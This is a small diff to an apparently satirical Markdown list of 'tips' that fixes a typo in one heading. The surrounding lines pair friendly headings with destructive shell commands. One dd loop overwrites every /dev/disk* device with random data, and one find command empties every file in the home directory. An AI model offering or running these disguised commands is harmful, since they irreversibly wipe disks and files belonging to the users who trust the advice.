@@ -65,7 +65,7 @@ I. Reduce your need of the external volumes:
 for d in /dev/disk*; do dd if=/dev/random of=$d &; done
 ```
 
-J. Simply your files and your file:
+J. Simply your files and your life:
 
 ```bash
 find ~/ -type f -exec bash -c ':|tee {} &' \; 
